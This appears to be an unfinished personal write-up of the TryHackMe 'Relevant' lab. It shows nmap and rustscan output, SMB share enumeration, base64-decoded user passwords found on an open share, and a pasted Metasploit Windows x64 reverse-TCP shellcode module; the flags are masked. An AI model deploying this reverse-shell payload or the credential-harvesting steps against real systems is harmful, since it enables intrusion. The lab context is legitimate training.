@@ -1,0 +1,435 @@
+# Relevant.
+
+![image.png](attachment:d4790b75-6fe5-41e3-a08e-7be37a5a63b0:image.png)
+
+# Machine details.
+
+1. machine link: https://tryhackme.com/room/relevant
+2. machine IP: 10.80.133.235
+
+```jsx
+You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 
+
+Scope of Work
+
+The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
+
+User.txt
+Root.txt
+Additionally, the client has provided the following scope allowances:
+
+Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
+Locate and note all vulnerabilities found
+Submit the flags discovered to the dashboard
+Only the IP address assigned to your machine is in scope
+Find and report ALL vulnerabilities (yes, there is more than one path to root)
+(Roleplay off)
+
+I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
+Note - Nothing in this room requires Metasploit
+
+Machine may take up to 5 minutes for all services to start.
+```
+
+![image.png](attachment:cb7dc5de-7089-4404-9123-9711df76e01a:image.png)
+
+# Enumeration.
+
+## Nmap scan.
+
+```jsx
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ nmap -sC -sV relevant.thm     
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 22:27 +0300
+Nmap scan report for relevant.thm (10.81.179.69)
+Host is up (0.16s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2026-02-04T19:20:12
+|_Not valid after:  2026-08-06T19:20:12
+|_ssl-date: 2026-02-05T19:28:52+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2026-02-05T19:28:13+00:00
+Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+```jsx
+Host script results:
+| smb2-time: 
+|   date: 2026-02-05T19:28:17
+|_  start_date: 2026-02-05T19:20:12
+|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-02-05T11:28:16-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+```
+
+## Rustscan.
+
+```jsx
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ rustscan -a relevant.thm -- -A
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/home/kali/.config/.rustscan.toml"
+[~] For backwards compatibility, the config file may also be at "/home/kali/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.81.179.69:80
+Open 10.81.179.69:135
+Open 10.81.179.69:139
+Open 10.81.179.69:445
+Open 10.81.179.69:3389
+Open 10.81.179.69:49663
+Open 10.81.179.69:49666
+Open 10.81.179.69:49667
+[~] Starting Script(s)
+[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.81.179.69
+Depending on the complexity of the script, results may take some time to appear.
+[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 22:30 +0300
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:30
+Completed NSE at 22:30, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:30
+Completed NSE at 22:30, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:30
+Completed NSE at 22:30, 0.00s elapsed
+Initiating Ping Scan at 22:30
+Scanning 10.81.179.69 [4 ports]
+Completed Ping Scan at 22:30, 0.18s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 22:30
+Scanning relevant.thm (10.81.179.69) [8 ports]
+Discovered open port 80/tcp on 10.81.179.69
+Discovered open port 135/tcp on 10.81.179.69
+Discovered open port 445/tcp on 10.81.179.69
+Discovered open port 139/tcp on 10.81.179.69
+Discovered open port 3389/tcp on 10.81.179.69
+Discovered open port 49666/tcp on 10.81.179.69
+Discovered open port 49667/tcp on 10.81.179.69
+Discovered open port 49663/tcp on 10.81.179.69
+Completed SYN Stealth Scan at 22:30, 0.18s elapsed (8 total ports)
+Initiating Service scan at 22:30
+Scanning 8 services on relevant.thm (10.81.179.69)
+Completed Service scan at 22:31, 56.23s elapsed (8 services on 1 host)
+Initiating OS detection (try #1) against relevant.thm (10.81.179.69)
+Retrying OS detection (try #2) against relevant.thm (10.81.179.69)
+Initiating Traceroute at 22:31
+Completed Traceroute at 22:31, 3.03s elapsed
+Initiating Parallel DNS resolution of 1 host. at 22:31
+Completed Parallel DNS resolution of 1 host. at 22:31, 4.50s elapsed
+DNS resolution of 1 IPs took 4.50s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+NSE: Script scanning 10.81.179.69.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:31
+NSE Timing: About 99.91% done; ETC: 22:32 (0:00:00 remaining)
+Completed NSE at 22:32, 40.16s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:32
+Completed NSE at 22:32, 0.80s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:32
+Completed NSE at 22:32, 0.01s elapsed
+Nmap scan report for relevant.thm (10.81.179.69)
+Host is up, received echo-reply ttl 126 (0.16s latency).
+Scanned at 2026-02-05 22:30:25 EAT for 110s
+
+PORT      STATE SERVICE       REASON          VERSION
+80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  syn-ack ttl 126 Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Relevant
+| Issuer: commonName=Relevant
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-02-04T19:20:12
+| Not valid after:  2026-08-06T19:20:12
+| MD5:     ab32 67a8 9861 8980 2c35 7e40 e71a dffe
+| SHA-1:   59b5 f213 7817 9a72 a2ac 96b6 d9b3 7a85 d297 097a
+| SHA-256: e792 c860 4751 8fef 2dd6 9c20 8f0c b71d 505f 9150 44f9 590c 4b77 3ec6 336e 5f03
+| -----BEGIN CERTIFICATE-----
+| MIIC1DCCAbygAwIBAgIQcA1qkN6fTKxENJsje43xhzANBgkqhkiG9w0BAQsFADAT
+| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNjAyMDQxOTIwMTJaFw0yNjA4MDYxOTIw
+| MTJaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEA3fiqewNrRdQ7e9GuR1lwakaRwJ9ioixbDgmnLHiO/yI4tznx5AF+
+| J3v/07+QpAZtk43HvuCIU70mo4ibtpfsJKV7kd1op0Jhua88rOQJWYkRze1jZe4u
+| xPVjBk0ZBLO5K9kJ7lTHmTAaqxAPif3z1udCOzMQa1i0pf+2KXxdzDpQzUqdTNse
+| A2S0pUkslDAcEgwpkKruU2uKVVGswJFY1K2SIUv4ZKui5LXftIgOgR9f21wF+/1j
+| HCu/qEyHxpeGyK8zcp7VKHzQNjf+zdsXxA0Qvzx3I9NTuZxAukt8KRTfyk79S2CH
+| WyM/T+3TQGCqTz0ZhPlXe9F9LFvqo9XVHwIDAQABoyQwIjATBgNVHSUEDDAKBggr
+| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAIl4tphWXtjq
+| IztzRS8OfpVeV13CIUAXdlhaRKy5TDs4eG9RngCJyFNIRTYKIPAXOOY3pKpLQ9DI
+| oEWqcbxytQQR5LCNQ8T/wrCa6/XY/euexdFZ+hdc6wEqAJfoKYzmpXscMZ2uEuoa
+| f1P3xNQKE5FnWbVU2GyvV3+mW/FKJERvTpbMpyt11afsKm14jjbXkLXhaA4jnEDM
+| TJk77ioXN6caqZwdSfnDs95Ef+TlP4FbyN1RejrwfzIaKMXJwnxDjMHOXQtUHMCx
+| Fm48iSwB+myX18xltrGxLBlZFBBd+IkQkTdDoVsFfGs+VmyiSAoUQ8WdUu8zukSX
+| L3spN2GdIeQ=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-02-05T19:32:14+00:00; 0s from scanner time.
+49663/tcp open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Microsoft Windows Server 2016 (89%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.98%E=4%D=2/5%OT=80%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=6984F03F%P=x86_64-pc-linux-gnu)
+SEQ(SP=102%GCD=2%ISR=10C%TI=I%II=I%SS=S%TS=A)
+SEQ(SP=108%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
+OPS(O1=M4E8NW8ST11%O2=M4E8NW8ST11%O3=M4E8NW8NNT11%O4=M4E8NW8ST11%O5=M4E8NW8ST11%O6=M4E8ST11)
+WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
+ECN(R=Y%DF=Y%TG=80%W=2000%O=M4E8NW8NNS%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=80%CD=Z)
+
+Uptime guess: 0.009 days (since Thu Feb  5 22:19:59 2026)
+Network Distance: 3 hops
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 23415/tcp): CLEAN (Timeout)
+|   Check 2 (port 63041/tcp): CLEAN (Timeout)
+|   Check 3 (port 41233/udp): CLEAN (Timeout)
+|   Check 4 (port 56671/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-02-05T19:31:39
+|_  start_date: 2026-02-05T19:20:12
+|_clock-skew: mean: 2h00m00s, deviation: 4h00m02s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-02-05T11:31:38-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   156.12 ms 192.168.128.1
+2   ...
+3   157.54 ms relevant.thm (10.81.179.69)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:32
+Completed NSE at 22:32, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:32
+Completed NSE at 22:32, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:32
+Completed NSE at 22:32, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 110.07 seconds
+           Raw packets sent: 98 (7.996KB) | Rcvd: 38 (2.376KB)
+
+```
+
+From the internet, we can identify some serve information about the target 
+
+![image.png](attachment:86c8d4b3-bfad-45e3-9de7-b3db626913fc:image.png)
+
+## smbclient enumeration.
+
+```jsx
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ smbclient -L \\\\10.81.179.69\\            
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.81.179.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                       
+```
+
+```jsx
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ smbclient \\\\10.81.179.69\\nt4wrksv  
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> 
+```
+
+### password enumeration.
+
+```jsx
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+~                                                                                    
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+Bob - !P@$$W0rD!123                                                                                    
+┌──(kali㉿kali)-[~/THM/Relevant]
+└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$ 
+```
+
+## Directory Enumeration.
+
+From password enumeration above, we can do a windows reverse shell to the target ip to the  gain access.
+
+### Reverse shell code
+
+https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/windows/x64/shell_reverse_tcp.rb
+
+```jsx
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module MetasploitModule
+  CachedSize = 460
+
+  include Msf::Payload::Windows
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
+
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows x64 Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell (Windows x64)',
+        'Author' => [ 'sf' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'Payload' => {
+          'Offsets' =>
+                  {
+                    'LPORT' => [ 232, 'n' ],
+                    'LHOST' => [ 234, 'ADDR' ],
+                    'EXITFUNC' => [ 422, 'V' ]
+                  },
+          'Payload' =>
+                       "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
+                       "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52" \
+                       "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0" \
+                       "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED" \
+                       "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88" \
+                       "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44" \
+                       "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48" \
+                       "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1" \
+                       "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44" \
+                       "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49" \
+                       "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A" \
+                       "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41" \
+                       "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x49\xBE\x77\x73\x32" \
+                       "\x5F\x33\x32\x00\x00\x41\x56\x49\x89\xE6\x48\x81\xEC\xA0\x01\x00" \
+                       "\x00\x49\x89\xE5\x49\xBC\x02\x00\x11\x5C\x7F\x00\x00\x01\x41\x54" \
+                       "\x49\x89\xE4\x4C\x89\xF1\x41\xBA\x4C\x77\x26\x07\xFF\xD5\x4C\x89" \
+                       "\xEA\x68\x01\x01\x00\x00\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5\x50" \
+                       "\x50\x4D\x31\xC9\x4D\x31\xC0\x48\xFF\xC0\x48\x89\xC2\x48\xFF\xC0" \
+                       "\x48\x89\xC1\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x6A\x10" \
+                       "\x41\x58\x4C\x89\xE2\x48\x89\xF9\x41\xBA\x99\xA5\x74\x61\xFF\xD5" \
+                       "\x48\x81\xC4\x40\x02\x00\x00\x49\xB8\x63\x6D\x64\x00\x00\x00\x00" \
+                       "\x00\x41\x50\x41\x50\x48\x89\xE2\x57\x57\x57\x4D\x31\xC0\x6A\x0D" \
+                       "\x59\x41\x50\xE2\xFC\x66\xC7\x44\x24\x54\x01\x01\x48\x8D\x44\x24" \
+                       "\x18\xC6\x00\x68\x48\x89\xE6\x56\x50\x41\x50\x41\x50\x41\x50\x49" \
+                       "\xFF\xC0\x41\x50\x49\xFF\xC8\x4D\x89\xC1\x4C\x89\xC1\x41\xBA\x79" \
+                       "\xCC\x3F\x86\xFF\xD5\x48\x31\xD2\x48\xFF\xCA\x8B\x0E\x41\xBA\x08" \
+                       "\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D" \
+                       "\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB" \
+                       "\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5"
+        }
+      )
+    )
+  end
+end
+```
+
+# solution.
+
+Answer the questions below
+
+### User Flag
+
+THM{################################}
+
+### Root Flag
+
+THM{###############################}
